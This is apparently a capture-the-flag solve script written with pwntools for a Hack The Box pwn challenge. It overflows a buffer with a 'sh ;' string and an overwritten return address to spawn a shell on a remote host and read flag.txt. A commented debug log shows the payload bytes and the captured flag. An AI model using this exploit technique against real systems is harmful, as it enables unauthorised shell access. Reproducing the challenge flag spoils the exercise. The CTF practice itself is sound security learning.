from pwn import *
context.log_level = 'debug'
def exploit():
    context.binary = ELF('sound_of_silence', checksec=False)
    r = remote('94.237.58.148', 31218)
    #r = process("./sound_of_silence")
    pay = flat(
        {
            32: b"sh ;\x00",
            40: 0x401169
        }
    )
    r.recvuntil(b'>> ')
    r.sendline(pay)
    r.sendline(b"cat flag.txt")
    r.interactive()
    r.close()

if __name__ == "__main__":
    exploit()

'''
┌──(wayell㉿wayell)-[~/…/pwn/sound_of_silence/pwn_sound_of_silence/challenge]
└─$ python3 solve.py
[+] Opening connection to 83.136.253.251 on port 37952: Done
[DEBUG] Received 0x30 bytes:
    00000000  1b 5b 48 1b  5b 4a 7e 54  68 65 20 53  6f 75 6e 64  │·[H·│[J~T│he S│ound│
    00000010  20 6f 66 20  53 69 6c 65  6e 63 65 20  69 73 20 6d  │ of │Sile│nce │is m│
    00000020  65 73 6d 65  72 69 73 69  6e 67 7e 0a  0a 3e 3e 20  │esme│risi│ng~·│·>> │
    00000030
[DEBUG] Sent 0x31 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  73 68 20 3b  00 61 61 61  69 11 40 00  00 00 00 00  │sh ;│·aaa│i·@·│····│
    00000030  0a                                                  │·│
    00000031
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[*] Switching to interactive mode
[DEBUG] Received 0x28 bytes:
    b'HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}\n'
HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Closed connection to 83.136.253.251 port 37952
'''